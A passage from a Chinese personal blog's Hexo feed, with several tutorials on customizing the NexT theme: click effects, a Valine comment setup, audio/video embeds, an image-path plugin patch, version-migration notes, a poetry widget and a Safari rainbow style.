class="built_in">setTimeout</span>(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<p>完成之后，需要配置调用它们的接口。</p>
</li>
</ul>
<p>在上一篇文章中提到过，新版 NexT 的重要更新就是</p>
<blockquote>
<p><strong>Custom File Support</strong></p>
<p>PR <a href="https://github.com/theme-next/hexo-theme-next/pull/868">#868</a> has adjusted the way of customizing the layout or style, canceling the custom files (such as <code>_custom/custom.styl</code>) in the original theme directory, and only retaining the way of specifying the custom file in the theme config file.</p>
<p>It is a good practice to separate the custom files from the theme files, so that you can add custom content without modifying the original source code of the theme, and avoid conflicts due to <code>git merge</code>.</p>
<p>As with <a href="https://hexo.io/docs/data-files">Data Files</a>, you can place all custom layouts or styles in a specific location (for example: <code>hexo/source/_data</code>). Add the custom file to <code>hexo/source/_data</code> and uncomment the content under the <code>custom_file_path</code> section in the theme config file.</p>
</blockquote>
<p>所以，你搜索到的方法可能已经过时，因为它们还在更改主题文件，下面是正确的方法。</p>
<p>为了更方便切换特效，在 <code>_config.next.yml</code> 文件中增加配置项：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mouse click effect: fireworks | explosion | love</span></span><br><span class="line"><span class="attr">cursor_effect:</span> <span class="string">explosion</span></span><br></pre></td></tr></table></figure>
<p>在 <code>_config.next.yml</code> 文件中，开启 <code>custom_file_path</code> 中的 <code>bodyEnd</code>，并在 <code>/source/_data/</code> 目录下新建 <code>body-end.njk</code> 文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;# mouse click effect #&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> theme.cursor_effect == <span class="string">&quot;fireworks&quot;</span> %&#125;</span><br><span class="line">  &lt;script <span class="keyword">async</span> src=<span class="string">&quot;/js/cursor/fireworks.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect == <span class="string">&quot;explosion&quot;</span> %&#125;</span><br><span class="line">  &lt;canvas <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;fireworks&quot;</span> style=<span class="string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;&lt;/canvas&gt;</span><br><span class="line">  &lt;script src=<span class="string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script <span class="keyword">async</span> src=<span class="string">&quot;/js/cursor/explosion.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect == <span class="string">&quot;love&quot;</span> %&#125;</span><br><span class="line">  &lt;script <span class="keyword">async</span> src=<span class="string">&quot;/js/cursor/love.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="http://yearito.cn/posts/hexo-theme-beautify.html">Hexo搭建个人博客系列：主题美化篇 | yearito’s Blog</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>在博客中添加评论功能</title>
    <url>/Blog-comment-function/</url>
    <content><![CDATA[<p>如果你想更好地和读者互动，评论功能必不可少。当然，写出足够优秀的文章是更好互动的前提。</p>
<a id="more"></a>

<p>评论系统用得最多的就是 Valine 和 Disqus。Valine 由于各种问题而被最新版 NexT 移除，但考虑到界面的简洁程度、网络环境影响的访问速度，我还是决定使用 Valine。</p>
<p>Valine 是一个快速简洁又高效的、依赖于 LeanCloud 的、无后端的评论系统。通过 <code>npm</code> 安装插件：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">npm install next-theme/hexo-next-valine</span><br></pre></td></tr></table></figure>
<p>注册 <a href="https://www.leancloud.cn/">LeanCloud</a>，创建应用，找到“应用 Keys”中的 <code>AppID</code> 和 <code>AppKey</code> 并记住。</p>
<p>在 <code>_config.next.yml</code> 中添加：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Valine</span></span><br><span class="line"><span class="comment"># For more information: https://valine.js.org, https://github.com/xCss/Valine</span></span><br><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">appId:</span>  <span class="comment"># your leancloud application appid</span></span><br><span class="line">  <span class="attr">appKey:</span>  <span class="comment"># your leancloud application appkey</span></span><br><span class="line">  <span class="attr">serverURLs:</span> <span class="comment"># When the custom domain name is enabled, fill it in here</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">Just</span> <span class="string">go</span> <span class="string">go</span> <span class="comment"># comment box placeholder</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">mm</span> <span class="comment"># gravatar style</span></span><br><span class="line">  <span class="attr">meta:</span> [<span class="string">nick</span>, <span class="string">mail</span>, <span class="string">link</span>] <span class="comment"># Custom comment header</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># pagination size</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">false</span> <span class="comment"># leancloud-counter-security is not supported for now. When visitor is set to be true, appid and appkey are recommended to be the same as leancloud_visitors&#x27; for counter compatibility. Article reading statistic https://valine.js.org/visitor.html</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># If false, comment count will only be displayed in post page, not in home page</span></span><br><span class="line">  <span class="attr">recordIP:</span> <span class="literal">false</span> <span class="comment"># Whether to record the commenter IP</span></span><br></pre></td></tr></table></figure>
<p>完成。</p>
<p>可以通过 Lean Cloud 管理评论。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://github.com/next-theme/hexo-next-valine">hexo-next-valine</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>在博客文章中插入音视频</title>
    <url>/Blog-insert-audio-video/</url>
    <content><![CDATA[<p>让文章更加丰富吧</p>
<a id="more"></a>

<p>如果你想在文章中插入喜欢的音乐或视频，可以在音乐或视频网站找到嵌入代码，Markdown 支持 html。</p>
<h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a><a href="https://music.163.com/">网易云音乐</a></h2><p>点击“生成外链播放器”，选择“iframe 插件”，选择尺寸和播放模式后，复制 HTML 代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=2&amp;id=1457707546&amp;auto=1&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1457707546&auto=1&height=66"></iframe>

<p><a href="https://y.qq.com/">QQ 音乐</a>不行。</p>
<h2 id="bilibili"><a href="#bilibili" class="headerlink" title="bilibili"></a><a href="https://www.bilibili.com/">bilibili</a></h2><p>点击“分享”，复制“嵌入代码”：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=69047664&amp;bvid=BV1nJ411T7m6&amp;cid=119667952&amp;page=1&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<iframe src="//player.bilibili.com/player.html?aid=69047664&bvid=BV1nJ411T7m6&cid=119667952&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p><a href="https://www.youtube.com/">YouTube</a>、<a href="https://www.youku.com/">优酷</a>、<a href="https://www.iqiyi.com/">爱奇艺</a>、<a href="https://v.qq.com/">腾讯视频</a> 等类似。</p>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>在博客文章中插入图片</title>
    <url>/Blog-insert-images/</url>
    <content><![CDATA[<p>“插入图片”会遇到什么问题呢？</p>
<a id="more"></a>

<p>“插入图片”本身就有两种含义：</p>
<ul>
<li>一种是在 Markdown 文档中插入图片，只需要 <code>![图片标题](图片路径)</code> 就可以；</li>
<li>另一种是让 Hexo 在渲染时插入图片。</li>
</ul>
<blockquote>
<p>上一篇文章说过，将 <code>_config.yml</code> 中的 <code>post_asset_folder</code> 设置为 <code>true</code> 时，每新建一篇文章就会在其同级文件夹新建一个同名文件夹，用于存放图片等附件。</p>
</blockquote>
<p>其实可以发现，插入图片最重要的就是图片的路径。</p>
<p>「路径」有「绝对路径」和「相对路径」之分：</p>
<ul>
<li><p>插入绝对路径是不可以的，因为 Hexo 渲染时会将 <code>source</code> 中的文件拷贝到 <code>public</code>，文件的绝对路径肯定会发生变化；</p>
</li>
<li><p>插入相对路径（图片相对于 Markdown 文档的路径）看似是可行的，但</p>
<ul>
<li>在 <code>source</code> 中，Markdown 文档在图片文件的上一层目录中；</li>
<li>在 <code>public</code> 中，Markdown 渲染成的 html 文件和图片文件在同一层。</li>
</ul>
<p>即 Hexo 的渲染也会改变图片和 Markdown 文档的相对路径。</p>
</li>
</ul>
<p>这时候，可以借助 <code>hexo-asset-image</code> 插件：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image –-save</span><br></pre></td></tr></table></figure>
<p>注意，安装好插件之后，一定要修改 <code>/node_modules/hexo-asset-image/index.js</code> 文件为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">hexo.extend.filter.register(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">        <span class="keyword">var</span> link = data.permalink;</span><br><span class="line">    <span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">            <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">            <span class="keyword">var</span> src = $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;</span><br><span class="line">               !<span class="regexp">/^\s*\//</span>.test(src)) &#123;</span><br><span class="line">              <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">              <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">              <span class="keyword">var</span> linkArray = link.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">var</span> srcArray = src.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">                srcArray.shift();</span><br><span class="line">              src = srcArray.join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">              $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class="line">              <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>否则会出现路径问题。</p>
<p>修改完成之后，无论是 Markdown 文档的本地预览还是 html 部署后，都可以完美地查看图片。</p>
<p>但还没有结束。</p>
<p>问题正是伴随着我的自定义界面而出现的： <code>hexo-asset-image</code> 插件会影响 Hexo 对 html 文件的渲染。</p>
<p>不仅如此，平时如果用 Markdown 写一些带有图片的报告，它的分享就会变得很麻烦，因为只能导出为 pdf 文档进行分享，才能让图片嵌入其中。</p>
<p>究其原因，就是 Markdown 文档和图片文件之间的联系太弱了，弱到移动文件的位置就会使它们之间的联系断开。</p>
<p>这时回到开始时的问题：Markdown 文档引用图片有绝对路径和相对路径之分，那么可不可以找到一个永久不变的「绝对路径」呢？</p>
<p>可以，那就是「图床」。</p>
<p>图床，就是把图片上传到云端服务器，然后通过插入链接来进行访问。它不仅可以解决图片文件路径的问题，还可以节省本地服务器空间并加快图片加载速度。</p>
<ul>
<li>推荐的图床：<a href="https://www.aliyun.com/product/oss">阿里云 OSS</a></li>
<li>推荐的图床上传工具：<a href="https://github.com/Molunerfinn/PicGo">PicGo</a></li>
</ul>
<p>上传到图床的图片文件名注意不要有 <code>+</code> 等符号，否则会上传失败。若上传图片失败，请检查图片文件名。</p>
<p>最新版 Typora 已经支持和 PicGo 梦幻联动，毫不夸张，可以让你写 Markdown 的效率翻倍。</p>
<p>最后别忘了，卸载 <code>hexo-asset-image</code> 插件。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://leay.net/2019/12/25/hexo/">Hexo 引用本地图片以及引用本地任意位置图片的一点思路 | 禾七博客</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>我和博客的一年</title>
    <url>/Blog-migration-process/</url>
    <content><![CDATA[<p>Hexo 和 NexT 在这一年都发生了什么？</p>
<a id="more"></a>

<p>前面文章提到过，NexT 一共有三个不同的仓库：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>年份</th>
<th>仓库</th>
</tr>
</thead>
<tbody><tr>
<td>v5.1.4 或更低</td>
<td>2014 ~ 2017</td>
<td><a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></td>
</tr>
<tr>
<td>v6.0.0 ~ v7.8.0</td>
<td>2018 ~ 2019</td>
<td><a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a></td>
</tr>
<tr>
<td>v8.0.0 或更高</td>
<td>2020 ~ ?</td>
<td><a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></td>
</tr>
</tbody></table>
<p>遗憾的是，每个新仓库的创建者都没有 Archive 旧仓库的权限。因此许多网络上的教程并不能区分这三个仓库的区别，特别是后两个名称相近的。为了避免安装错误的 NexT，请务必严格按照最新仓库 README 中提供的安装方式进行操作。</p>
<p>我刚开始搭建博客的时候，是 2020 年 1 月，当时没有仔细了解，安装的是 NexT v5 版本，也就是第一个仓库的版本。两个多月之后，由于电脑的问题，开始了第一次迁移。多亏了 GitHub，我的文章不至于全部消失。其实迁移博客只需要把原博客根目录下的 source 文件夹拷贝到新建好的博客根目录，再配置一下主题即可。当时由于 v5 功能过少<del>（其实我只是为了网站页脚的小图标能动起来）</del>，迁移时将 NexT 升级到了 v7。迁移后有了动态的图标，还有 Safari 的彩虹效果等新功能。</p>
<p>2021 年 2 月，迁移博客时升级到了 NexT v8。跨版本的升级可能并不顺滑（例如由 v5.1.4 或 v7.8.0 升级至 v8.0.0），请备份配置文件及修改过的文件（例如自定义模板文件）后，重新安装新的主题。具体操作请阅读文档： <a href="https://theme-next.js.org/docs/getting-started/upgrade.html">https://theme-next.js.org/docs/getting-started/upgrade.html</a></p>
<p>这次升级（从 v7 到 v8）有很多重大改变：</p>
<ul>
<li><p><strong>v7.4.2 Nunjucks 引擎</strong></p>
<p>鉴于 swig 缺乏维护，NexT 自 7.4.2 版本开始，使用 Nunjucks 代替 swig 作为模版引擎。如果此前根据 swig 的语法写过自定义内容，请在更新前确认它们是与 Nunjucks 兼容的，否则会报错，且生成的页面为空白。例如， Nunjucks 只支持 <code>and</code> 运算符，需要替换掉 swig 中的 <code>&amp;&amp;</code>。见 <a href="http://mozilla.github.io/nunjucks/getting-started.html">http://mozilla.github.io/nunjucks/getting-started.html</a></p>
<p>Hexo 5.0 版本移除了对于 swig 模版的支持，改为独立的 hexo-renderer-swig 插件。如果你在使用旧版本的 NexT，并发现 Hexo 生成的 html 中输出了模版源码，请根据 NexT 官网「Hexo 与 NexT 兼容性」部分的内容选择升级 NexT 或降级 Hexo。我们不建议继续使用旧版本的 NexT。</p>
</li>
<li><p><strong>v7.6.0 <code>auto_excerpt</code></strong></p>
<p>自 7.6.0 版本开始，<code>auto_excerpt</code> 功能被移除，因为它并不属于 Hexo 主题应当负责的内容，并对 NexT 的开发造成了麻烦。我们推荐通过 <code>&lt;!-- more --&gt;</code> 来精确控制 Read More 的位置；或者设置 <code>excerpt_description</code> 然后为每篇文章指定 <code>description</code>。当然，也可以自行安装第三方插件：</p>
<p><a href="https://github.com/chekun/hexo-excerpt">https://github.com/chekun/hexo-excerpt</a><br><a href="https://github.com/ashisherc/hexo-auto-excerpt">https://github.com/ashisherc/hexo-auto-excerpt</a></p>
<p>作出以上改动后，请执行 <code>hexo clean</code>。</p>
</li>
<li><p><strong>v8.0.0-rc.1 自定义图标</strong></p>
<p>NexT 主题自 8.0.0 版本开始，将自带的 Font Awesome 图标库由 4.7.0 版本升级为了 5.13.0 版本。此次升级并不向下兼容，请修改配置文件中与 Font Awesome 相关的内容，否则图标可能无法正常显示。</p>
<p>全部可选图标在此： <a href="https://fontawesome.com/icons">https://fontawesome.com/icons</a></p>
</li>
<li><p><strong>v8.1.0 移除 Valine</strong></p>
<p>Valine 评论系统出现了一些令人担忧的问题：</p>
<ul>
<li>NexT 团队曾多次收到关于 Valine 评论系统存在隐私泄露问题的反馈；</li>
<li>Valine 自 1.4 版本起不再开源，因此 NexT 团队无法对 Valine 评论系统 Debug。并且发布的打包版本中存在未告知用户的百度统计代码；</li>
<li>2020 年 11 月下旬出现了针对 Valine 评论系统的攻击。</li>
</ul>
<p>考虑到这些问题已经严重影响到 NexT 用户的数据安全，我们决定将其移除，需要继续使用的用户请安装插件： <a href="https://github.com/next-theme/hexo-next-valine%EF%BC%88%E6%8F%92%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E9%A1%B9%E4%BD%BF%E7%94%A8%E9%A9%BC%E5%B3%B0%E5%91%BD%E5%90%8D%EF%BC%8C%E4%B8%8E">https://github.com/next-theme/hexo-next-valine（插件的配置项使用驼峰命名，与</a> Valine 本身一致，需要注意将 <code>appid</code> 和 <code>appkey</code> 改为 <code>appId</code> 和 <code>appKey</code>）</p>
<p>鉴于以上原因，如果在使用 Valine 时出现<em>任何</em>问题，请在这里反馈： <a href="https://github.com/xCss/Valine/issues">https://github.com/xCss/Valine/issues</a></p>
<p>迁移到 Disqus： <a href="https://github.com/YunYouJun/valine-to-disqus">https://github.com/YunYouJun/valine-to-disqus</a></p>
</li>
<li><p>欢迎加入 Telegram 群，讨论问题更方便</p>
<p>中文群：<a href="https://t.me/theme_next_cn">https://t.me/theme_next_cn</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>有谁不沉迷唐诗宋词呢？</title>
    <url>/Blog-poetry/</url>
    <content><![CDATA[<p>喜欢诗词的同学绝对要添加的一个功能。</p>
<a id="more"></a>

<p>其实很简单，只是调用一个现成的接口，并不会自己写一个诗词库。</p>
<p>在 <code>_config.next.yml</code> 文件中，开启 <code>custom_file_path</code> 中的 <code>footer</code>，并在 <code>/source/_data/</code> 目录下新建 <code>footer.njk</code> 文件（可以是其他你想放置的位置）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;jinrishici-sentence&quot;</span>&gt;</span>正在加载今日诗词....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://sdk.jinrishici.com/v2/browser/jinrishici.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>完成。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://www.jinrishici.com/doc/#json-fast-easy">通用简单安装代码 | 今日诗词开放接口 - 今日诗词</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>让博客在 Safari 上发光</title>
    <url>/Blog-safari-rainbow/</url>
    <content><![CDATA[<p>Safari 工具栏上的 RGB 是怎么实现的？</p>
<a id="more"></a>

<p>从 OS X Yosemite 系统开始，Safari 浏览器的顶部工具栏加入了类似 iOS 中的半透明毛玻璃效果。Safari 会自动根据页面的颜色来显示工具栏的毛玻璃特效颜色。</p>
<p>在 NexT 的某一版本中内置了这一功能（v7.7.2 中仍保留）：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hide sticky headers and color the menu bar on Safari (iOS / macOS).</span></span><br><span class="line"><span class="attr">safari_rainbow:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>遗憾的是，最新版 NexT 移除了这一功能。还可以通过自定义配置实现。</p>
<p>在 <code>_config.next.yml</code> 文件中，开启 <code>custom_file_path</code> 中的 <code>style</code>，并在 <code>/source/_data/</code> 目录下新建 <code>styles.styl</code> 文件：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (-webkit-min-device-pixel-ratio: <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="selector-tag">body</span>:before &#123;</span><br><span class="line">        <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">2147483647</span>;</span><br><span class="line">        <span class="attribute">position</span>: fixed;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="attribute">display</span>: block;</span><br><span class="line">        -webkit-<span class="attribute">transform</span>: translateY(-<span class="number">99.99px</span>);</span><br><span class="line">        <span class="attribute">background</span>: linear-gradient(<span class="number">124deg</span>,</span><br><span class="line">        <span class="number">#FF0000</span>,</span><br><span class="line">        <span class="number">#FF7F00</span>,</span><br><span class="line">        <span class="number">#FFFF00</span>,</span><br><span class="line">        <span class="number">#7FFF00</span>,</span><br><span class="line">        <span class="number">#00FF00</span>,</span><br><span class="line">        <span class="number">#00FF7F</span>,</span><br><span class="line">        <span class="number">#00FFFF</span>,</span><br><span class="line">        <span class="number">#007FFF</span>,</span><br><span class="line">        <span class="number">#0000FF</span>,</span><br><span class="line">        <span class="number">#7F00FF</span>,</span><br><span class="line">        <span class="number">#FF00FF</span>,</span><br><span class="line">        <span class="number">#FF007F</span>,</span><br><span class="line">        #FF0000);</span><br><span class="line">        <span class="attribute">animation</span>: rainbow <span class="number">15s</span> ease infinite;</span><br><span class="line">        <span class="attribute">background-size</span>: <span class="number">1000%</span> <span class="number">1000%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> rainbow &#123;</span><br><span class="line">    <span class="number">0%</span> &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">80%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">50%</span> &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">20%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">80%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://zhangshuqiao.org/2018-11/Safari%E9%A1%B6%E6%A0%8F%E5%BD%A9%E8%99%B9%E6%95%88%E6%9E%9C/">Safari顶栏彩虹效果 | 米米的博客</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>博客文章如何置顶？</title>
    <url>/Blog-top-article/</url>
    <content><![CDATA[<p>如果你想让访客访问你的博客时首先看到某些文章，置顶功能必不可少。</p>
<a id="more"></a>

<p>这一功能没找到在主题中实现的方法，只能修改 Hexo 文件。</p>
<p>修改 <code>/node_modules/hexo-generator-index/lib/generator.js</code> 文件为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pagination = <span class="built_in">require</span>(<span class="string">&#x27;hexo-pagination&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; sort &#125; = <span class="built_in">require</span>(<span class="string">&#x27;timsort&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> config = <span class="built_in">this</span>.config;</span><br><span class="line">  <span class="keyword">const</span> posts = locals.posts.sort(config.index_generator.order_by);</span><br><span class="line"></span><br><span class="line">  